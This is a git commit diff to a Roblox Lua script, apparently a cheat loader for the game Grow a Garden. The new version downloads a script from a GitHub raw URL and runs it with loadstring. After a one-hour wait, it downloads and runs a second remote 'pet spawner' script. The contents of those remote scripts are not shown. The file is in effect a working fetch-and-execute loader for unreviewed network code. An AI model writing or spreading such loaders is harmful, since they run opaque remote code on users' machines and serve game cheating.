c61cee7f073d1a6010efbd6837569b0106e2c57f
vthangsitink <191318345+Day326@users.noreply.github.com>
2025-05-27 09:32:29 +0800

    GrowAGarden.lua

--- GrowAGarden.lua
+++ GrowAGarden.lua
@@ -1,9 +1,3 @@
-local function gui()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Day326/Dark-Continent/refs/heads/main/DarkScience.lua"))()
-end
-local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual",true))()
-end
- 
-task.spawn(gui)
-task.spawn(farm)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Day326/Dark-Continent/refs/heads/main/DarkScience.lua"))()
+wait(3600)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
